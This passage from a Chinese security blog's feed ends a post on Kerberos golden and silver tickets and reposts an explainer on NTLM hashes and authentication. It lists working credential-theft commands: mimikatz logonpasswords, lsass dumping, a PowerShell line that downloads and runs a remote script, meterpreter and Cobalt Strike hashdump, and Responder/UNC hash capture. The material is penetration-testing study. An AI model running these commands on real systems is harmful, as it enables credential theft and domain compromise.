class="string">-5</span><span class="string">-21</span><span class="string">-4155807533</span><span class="string">-921486164</span><span class="string">-2767329826</span> /target:WIN<span class="string">-8</span>VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"</span><br></pre></td></tr></table></figure><p>此时可以成功访问域控上的文件共享</p><h4 id="关于黄金票据和白银票据的一些区别"><a href="#关于黄金票据和白银票据的一些区别" class="headerlink" title="关于黄金票据和白银票据的一些区别:"></a>关于黄金票据和白银票据的一些区别:</h4><h5 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h5><ul><li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>Silver Ticket: 伪造TGS,只能访问指定的服务</li></ul><p><strong>2.加密方式不同</strong></p><ul><li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ul><h5 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h5><ul><li>Golden Ticket 的利用过程需要访问域控(KDC)</li><li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ul><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p>[<a href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]</a>(<a href="https://wooyun.js.org/drops/域渗透——Pass" target="_blank" rel="noopener">https://wooyun.js.org/drops/域渗透——Pass</a> The Ticket.html)</p><p><a href="http://www.test666.me/archives/264/" target="_blank" rel="noopener">http://www.test666.me/archives/264/</a></p><p><a href="https://uknowsec.cn/posts/notes/域渗透-Ticket.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.html</a></p><p><a href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/</a></p><p><a href="http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/" target="_blank" rel="noopener">http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/</a></p><h5 id=""><a href="#" class="headerlink" title=""></a></h5>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;浅析黄金票据与白银票据&quot;&gt;&lt;a href=&quot;#浅析黄金票据与白银票据&quot; class=&quot;headerlink&quot; title=&quot;浅析黄金票据与白银票据&quot;&gt;&lt;/a&gt;浅析黄金票据与白银票据&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="票据" scheme="https://shu1l.github.io/tags/%E7%A5%A8%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>域渗透之NTML hash</title>
    <link href="https://shu1l.github.io/2020/06/05/yu-shen-tou-zhi-ntml-hash/"/>
    <id>https://shu1l.github.io/2020/06/05/yu-shen-tou-zhi-ntml-hash/</id>
    <published>2020-06-05T14:25:49.000Z</published>
    <updated>2020-11-25T08:56:36.959Z</updated>
    
    <content type="html"><![CDATA[<p><strong>转载自:</strong><a href="https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/" target="_blank" rel="noopener">https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/</a></p><h2 id="域渗透之NTML-Hash"><a href="#域渗透之NTML-Hash" class="headerlink" title="域渗透之NTML-Hash"></a>域渗透之NTML-Hash</h2><h3 id="一、认识Windows-HASH"><a href="#一、认识Windows-HASH" class="headerlink" title="一、认识Windows HASH"></a>一、认识Windows HASH</h3><p>​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了<strong>WindowsNT挑战/响应验证机制</strong>，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。</p><p>​     NTLM-Hash与LM-Hash算法相比，明文口令大小写敏感，但无法根据NTLM-Hash判断原始明文口令是否小于8字节，摆脱了魔术字符串<code>KGS!@#$%</code>。MD4是真正的单向哈希函数，穷举做为数据源出现的明文，难度较大。问题在于，微软一味强调NTLM-Hash的强度高，却避而不谈一个事实，为了保持向后兼容性，NTLM-Hash缺省总是与LM-Hash一起使用的。这意味着NTLM-Hash强调再高也是无助于安全的，相反潜在损害着安全性。增加NTLM-Hash后，首先利用LM-Hash的弱点穷举出原始明文口令的大小写不敏感版本，再利用NTLM-Hash修正出原始明文口令的大小写敏感版本</p><h4 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM HASH"></a>LM HASH</h4><p>​    <code>LM HASH</code>是一种较古老的Hash，在<code>LAN Manager</code>协议中使用，非常容易通过暴力破解获取明文凭据。Vista以前的Windows OS使用它，Vista之后的版本默认禁用了LM协议，但某些情况下还是可以使用。</p><p><strong>补充：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows Vista`和`Windows<span class="built_in"> Server </span>2008`以前的系统还会使用LM hash。LM hash的生成方法本文暂不介绍。自Vista和2008开始，Windows取消LM hash，但某些工具的参数需要填写固定格式`LM hash:NT hash`，可以将LM Hash填0(LM hash可以为任意值)，即`00000000000000000000000000000000:NT hash</span><br></pre></td></tr></table></figure><h4 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM HASH"></a>NTLM HASH</h4><p>​    <code>NTLM Hash（NT LAN Manager）</code>是支持<code>Net NTLM</code>认证协议及<code>本地认证</code>过程中的一个重要参数。其长度为32位，由数字与字母组成。它的前身是<code>LM Hash</code>，目前基本淘汰，两者相差不大，只是使用的加密算法不同。</p><p><strong>本地认证</strong>：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在<code>SAM (Security Account Manager Database，安全账号管理数据库)</code>中。SAM文件的路径是<code>%SystemRoot%\system32\config\sam</code>。在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较，从而实现认证。</p><blockquote><p>Note：类似的，在域环境下，DC (Domain Controller，域控制器)中也存在这样的数据库<code>AD (Account Database)</code>，位于<code>ntds.dit</code>文件</p></blockquote><p>NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p><p>通常意义上的<code>NTLM Hash</code>指存储在<code>SAM</code>数据库及<code>NTDS数据库</code>中对密码进行Hash摘要计算后的结果，这类Hash可以直接用于PTH，并且通常存在于<code>LSASS</code>进程中，便于SSP使用。</p><p>本地认证流程</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">winlogon</span>.exe -&gt;</span> 接收用户输入 -&gt; <span class="function"><span class="title">lsass</span>.exe -&gt;</span> (认证)</span><br></pre></td></tr></table></figure><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对比SAM数据库中的hash进行验证。</p><ul><li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li></ul><p>在系统中，hash格式是类似这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssooking:1001:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::</span><br></pre></td></tr></table></figure><h4 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM-Hash的生成"></a>NTLM-Hash的生成</h4><p>用户密码为<code>test123</code></p><p>转换成十六进制的格式为<code>74657374313233</code></p><p>转换成Unicode格式为<code>7400650073007400310032003300</code></p><p>对字符串<code>7400650073007400310032003300</code>以十六进制格式作MD4加密，结果为<code>c5a237b7e9d8e708d8436b6148a25fa1</code></p><p><strong>注：</strong></p><p>MD4加密可使用工具HashCalc，如下图</p><p>IBM设计的LM Hash算法存在几个弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash便应运而生。假设明文口令是<code>123456</code>，首先转换成<code>Unicode</code>字符串，与LM Hash算法不同，这次不需要添加0补足14字节</p><p><code>123456</code> -&gt; <code>310032003300340035003600</code>。</p><blockquote><p>从<code>ASCII</code>串转换成Unicode串时，使用<code>little-endian(小端)</code>序。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成 0×00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0×00。</p></blockquote><p>对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值，</p><p>16字节 <code>310032003300340035003600</code>- 进行标准MD4单向哈希 -&gt; <code>32ED87BDB5FDC5E9CBA88547376818D4</code>，</p><p>就得到了最后的NTLM Hash：<code>32ED87BDB5FDC5E9CBA88547376818D4</code></p><p>实验环境下，测试服务器可以先关闭密码复杂性策略，设置一个简单的密码。</p><blockquote><p>gpedit.msc – 本地组策略编辑器 – 计算机配置 - windows设置 - 安全设置 - 帐户策略 - 密码策略</p></blockquote><p>后文以Adminstrator NTML Hash 为例。明文密码为<code>toor</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br></pre></td></tr></table></figure><h3 id="二、NTML网络认证机制"><a href="#二、NTML网络认证机制" class="headerlink" title="二、NTML网络认证机制"></a>二、NTML网络认证机制</h3><h5 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h5><p>​    NTLM是除<code>Kerberos</code>之外的一种网络认证协议，只支持Windows。它是一种基于质询/应答 (Challenge/Response)消息交换模式的认证机制， 常用于工作组和域环境下<code>登录场景的身份认证</code>。</p><h4 id="基于NTML协议的身份认证机制"><a href="#基于NTML协议的身份认证机制" class="headerlink" title="基于NTML协议的身份认证机制"></a>基于NTML协议的身份认证机制</h4><p>​    NTML网络认证采用质询/应答 (Challenge/Response) 模式进行数据交换，通过传输加密的<code>Challenge/Response</code>值并进行对比，从而验证用户身份。NTML网络认证会使用用户密码的Hash作为密钥，来加密<code>Challenge</code>，用户只有在输对密码的情况下，才能够同样利用密码的hash进行解密。这样通过对比两端的计算结果来判断凭据是否有效，从而实现身份认证。这样的好处是，用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性。</p><p>通过交互过程中维护的<code>凭证（credential）</code>，包括域名、用户名、用户密码的hash串</p><blockquote><p>ps：域名信息会自动在数据包中携带，无需用户手动输入。</p></blockquote><p><strong>NTLM的认证过程</strong>分为三步：协商、质询、验证：</p><ul><li><strong>协商</strong>：主要用于确认双方协议版本</li><li><strong>质询</strong>：质询/应答 (Challenge/Response) 模式，用于消息交换</li><li><strong>验证</strong>：验证身份合法性，通常由Server端或域控制器完成这个过程</li></ul><p><strong>NTML的认证方式</strong>分为<code>Interactive（交互式）</code>和<code>Noninteractive（非交互式）</code>：</p><p><code>交互式验证</code>：交互式提供必要凭据，通常应用场景通常为登录，即用户要登录某台客户端。</p><p><code>非交互式验证</code>：无需交互式提供凭据，在实际应用中，比如命令行直接指定用户名、密码的方式登录，再比如我们在客户端上使用<code>net use</code>命令去映射服务器上某个共享文件夹的方式，这些便属于属于非交互式认证。但非交互式认证的应用场景更多的是<strong>已登录某客户端的用户去请求另一台服务器的资源</strong> ，或者为单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\<span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>\$share /u:administrator password</span><br></pre></td></tr></table></figure><p>NTML认证机制在<code>工作组</code>环境下和在<code>域环境</code>下是不同的。</p><p>​    <strong>工作组</strong>和<strong>域</strong>宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。在认证体系中，工作组和域的主要区别在于，工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是<code>点对点</code>的。因此，在工作组环境下进行访问认证，仅涉及<strong>Client</strong>和<strong>Server</strong>。我们使用的个人计算机，默认便处于WORKGROUP工作组环境下。</p><p>​    域是一个有安全边界的计算机集合，同一个域中的计算机通过<code>共同的第三方信任机构</code>建立信任关系，这个第三方信任机构角色由<code>DC (Domain Controller，域控制器)</code> 担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：<strong>Client、Server、DC</strong> 。</p><blockquote><p>注意：在Windows域环境下涉及三方的<strong>访问认证</strong>场景中，即客户端想要访问服务器资源的情况下，采用 <strong>基于Kerberos协议的网络认证机制</strong>，NTML认证机制参与认证过程。此部分详细内容请参考<a href="">域渗透之Kerberos</a> 。</p></blockquote><p>​    下面我们就来分别介绍一下在工作组和域环境下，基于NTML协议的网络认证机制的工作流程。以交互式为例。</p><h4 id="工作组环境NTML认证流程"><a href="#工作组环境NTML认证流程" class="headerlink" title="工作组环境NTML认证流程"></a>工作组环境NTML认证流程</h4><p>工作组中，涉及Clinet、Server，流程如下：</p><ul><li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li><li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li><li>服务器生成一个16字节的随机数，称为<strong><em>质询\</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li><li>客户端使用缓存的<strong><em>用户密码的哈希值\</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器。</li><li>服务器使用username从SAM帐户数据库中检索用户密码的hash，使用该hash来加密challenge，并与客户端计算的响应值进行比较。如果它们相同，则验证成功。</li></ul><h4 id="域环境NTML认证流程"><a href="#域环境NTML认证流程" class="headerlink" title="域环境NTML认证流程"></a>域环境NTML认证流程</h4><p>在域环境下多了域控制器的角色，微软给出的说明是这样的：</p><blockquote><ol><li>(Interactive  authentication only) A user accesses a client computer and provides a  domain name, user name, and password. The client computes a  cryptographic <a href="https://msdn.microsoft.com/en-us/library/ms721586(v=VS.85).aspx" target="_blank" rel="noopener"><em>hash</em></a> of the password and discards the actual password.</li><li>The client sends the user name to the server (in <a href="https://msdn.microsoft.com/en-us/library/ms721603(v=VS.85).aspx" target="_blank" rel="noopener"><em>plaintext</em></a>).</li><li>The server generates a 16-byte random number, called a <em>challenge</em> or <a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>nonce</em></a>, and sends it to the client.</li><li>The client encrypts this challenge with the hash of the user’s  password and returns the result to the server. This is called the <em>response</em>.</li><li>The server sends the following three items to the domain controller:<ul><li>User name</li><li>Challenge sent to the client</li><li>Response received from the client</li></ul></li><li>The domain controller uses the user name to retrieve the hash of  the user’s password from the Security Account Manager database. It uses  this password hash to encrypt the challenge.</li><li>The domain controller compares the  encrypted challenge it computed (in step 6) to the response computed by  the client (in step 4). If they are identical, authentication is  successful.</li></ol></blockquote><p>翻译过来流程大致如下：</p><ol><li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li><li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li><li>服务器生成一个16字节的随机数，称为<strong><em>质询\</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li><li>客户端使用缓存的<strong><em>用户密码的哈希值\</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器</li><li>服务器将<strong><em>Username、Challenge、Response\</em></strong><code>（Net-NTML hash）</code>发送给<strong><em>DC (Domain Controller，域控制器)\</em></strong></li><li>DC域控制器从<strong><em>AD (Account Database，帐户数据库)\</em></strong> 中检索该用户名，并提取用户密码的NTML hash，使用该hash来加密challenge，并且把这个值和客户端计算的响应值进行比较。如果它们相同，则验证成功。</li></ol><h3 id="三、如何拿到Hash"><a href="#三、如何拿到Hash" class="headerlink" title="三、如何拿到Hash?"></a>三、如何拿到Hash?</h3><h5 id="1-本地获取"><a href="#1-本地获取" class="headerlink" title="1.本地获取"></a>1.本地获取</h5><p>在渗透测试中，通常可从Windows系统中的<code>SAM</code>文件和域控的<code>NTDS.dit</code>文件中获得用户hash，通过读取<code>lsass.exe</code>进程能获得已登录用户的NTLM hash。许多工具能够方便地为我们完成这些工作。但需要注意的是：</p><blockquote><p>大部分这种本地抓取hash的工具都需要管理员权限</p></blockquote><p>常用工具：</p><ul><li><p><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" target="_blank" rel="noopener">QuarksPwDump</a></p></li><li><p><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></p></li><li><p><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></p></li><li><p><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></p></li><li><p>Cobaltstrike</p></li><li><p><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" target="_blank" rel="noopener">QuarksPwDump</a></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quarkspwdump.exe -dhl</span><br></pre></td></tr></table></figure><ul><li><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>更方便的mimikatz命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords full"</span></span><br></pre></td></tr></table></figure><p>执行以下命令除了回显，还可以dump结果并将hash保存为log日志文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span><span class="built_in">log</span> sekurlsa::logonpasswords full<span class="string">""</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></li></ul><p><code>prodump</code>是微软提供的一个命令行实用程序，用于监视应用程序并生成故障转储。我们可以用它先dump对方主机的<code>LSASS</code>内存文件，然后在自己主机用<code>mimikatz</code>等工具进行处理。这种方式的好处是可以避免被查杀。先转储<code>LSASS</code>内存文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>然后本地用<code>mimikatz</code>对<code>LSASS</code>内存文件进行破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>类似<code>ProDump</code>的工具还有：<strong>fgdump</strong>、<strong>pwdump</strong>、<strong>cachedump</strong>等。利用powershell也能够像<code>Prodump</code>一样转储lsass文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'</span>); <span class="string">"Get-Process lsass | Out-Minidump"</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></li></ul><p>首先需要获取<code>SYSTEM</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>在<code>metasploit</code>中利用<code>mimikatz</code>获取hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure><p><code>metasploit</code>提供的抓取hash的一些模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><p><code>smart_hashdump</code>模块会把dump的hash文件保存在<code>/root/.msf4/loot</code>目录下，并且该模块一定程度上能够绕过<code>windows UAC</code>。</p><p>顺便介绍一些能够直接获取明文密码的模块命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; wdigest （kerberos）</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords </span><br><span class="line"></span><br><span class="line">meterpreter&gt;load kiwi</span><br><span class="line">meterpreter&gt; creds_wdigest</span><br></pre></td></tr></table></figure><h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">beacon&gt; </span>getuid</span><br><span class="line"><span class="keyword">beacon&gt; </span>powershell-<span class="meta">import</span> /root/powershell/<span class="meta">Get</span>-PassHashes.ps1</span><br><span class="line"><span class="keyword">beacon&gt; </span>powershell <span class="meta">Get</span>-PassHashes</span><br></pre></td></tr></table></figure><p> 读取hash，需要administer权限(右击目标主机–<code>Access</code>-<code>hashdump</code>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; wdigest //读取信息</span><br><span class="line">beacon&gt; hashdump</span><br></pre></td></tr></table></figure><p>运行mimikatz(右击目标主机–<code>Access</code>- <code>RUN mimikatz</code>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; logonpasswords</span><br></pre></td></tr></table></figure><p>右击受害者主机–access-hashdump</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell-import /root/powershell/Inveigh/Inveigh.ps1</span><br><span class="line">beacon&gt; powershell Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y -PROXY Y</span><br></pre></td></tr></table></figure><h4 id="2-网络欺骗"><a href="#2-网络欺骗" class="headerlink" title="2.网络欺骗"></a>2.网络欺骗</h4><p>通常我们采用网络欺骗技术，配合受害者交互的方式窃取到是Net-NTLM Hash。这类hash并不能直接用于<code>pass-the-hash</code>攻击，但可以通过暴力破解的方式来获取明文密码。关于更多获取<code>Net-NTML HASH</code>的技巧，可以参考</p><p>常用工具：</p><ul><li>Responder</li><li>Metasploit</li></ul><h5 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h5><p><code>responder</code>可以伪造服务，对相关请求进行响应。开启命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure><p>实战环境下，我们应该修改<code>/etc/responder/Responder.conf</code>配置文件，关闭其中的一些不必要的服务，从而减少网络流量，并产生针对性日志，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; Servers to start</span><br><span class="line">SQL = Off</span><br><span class="line">SMB = On</span><br><span class="line">Kerberos = On</span><br><span class="line">FTP = Off</span><br><span class="line">POP = Off</span><br><span class="line">SMTP = Off</span><br><span class="line">IMAP = Off</span><br><span class="line">HTTP = On</span><br><span class="line">HTTPS = On</span><br><span class="line">DNS = On</span><br><span class="line">LDAP = On</span><br></pre></td></tr></table></figure><p>针对测试而言，我们还可以设置<code>Challenge</code>值，以便观察流量格式：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Challenge</span> = <span class="number">1122334455667788</span></span><br></pre></td></tr></table></figure><p>开启监听后，当用户进行了交互，如在资源管理器中以<code>UNC</code>路径形式访问伪造的服务器：</p><p>此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了<code>NET NTML Hash</code>。<code>responder</code>默认会将日志保存在<code>/usr/share/responder/logs</code>下，hash记录文件以<code>HTTP-NTLMv2</code>   <code>SMBv2-NTLMv2</code>等前缀开头。</p><p>在渗透测试中，我们还可以通过其他技巧获取<code>Net-NTML Hash</code>，如：</p><ul><li>命令执行：<code>regsvr32</code>、<code>powershell</code>等</li><li>钓鱼文档：doc、docx、pdf</li><li>后门设置：</li></ul><p>例：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /u /i:<span class="comment">//17.10.0.1/@abc hello.dll</span></span><br><span class="line"></span><br><span class="line">powershell -c <span class="string">"Invoke-Item \\17.10.0.1\aa"</span></span><br><span class="line">powershell -nop -exec bypass -c <span class="string">"Invoke-Item \\17.10.0.1\aa"</span></span><br><span class="line">Invoke-Item \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br><span class="line">Get-Content \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br><span class="line">Start-Process \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br></pre></td></tr></table></figure><h5 id="3-其他技巧"><a href="#3-其他技巧" class="headerlink" title="3.其他技巧"></a>3.其他技巧</h5><p>还有许多其他<code>Credential Dumping</code>姿势，可以参考：</p><p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">dumping-domain-password-hashes</a></p><p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">Places of Interest in Stealing NetNTLM Hashes</a> 及译文 <a href="https://paper.seebug.org/474/" target="_blank" 